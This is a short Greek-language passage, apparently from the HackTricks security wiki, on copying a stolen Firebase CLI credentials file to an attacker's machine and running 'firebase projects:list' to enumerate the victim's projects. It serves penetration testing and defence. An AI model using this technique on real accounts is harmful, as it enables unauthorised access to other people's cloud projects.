Ο επιτιθέμενος αποκτά πρόσβαση στο αρχείο διαπιστευτηρίων του Firebase CLI. Μπορεί στη συνέχεια να αντιγράψει ολόκληρο το αρχείο στο δικό του σύστημα, και το Firebase CLI θα χρησιμοποιήσει αυτόματα τα διαπιστευτήρια από την προεπιλεγμένη του τοποθεσία. Αφού το κάνει αυτό, ο επιτιθέμενος μπορεί να δει όλα τα Firebase projects που είναι προσβάσιμα από αυτόν τον χρήστη.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
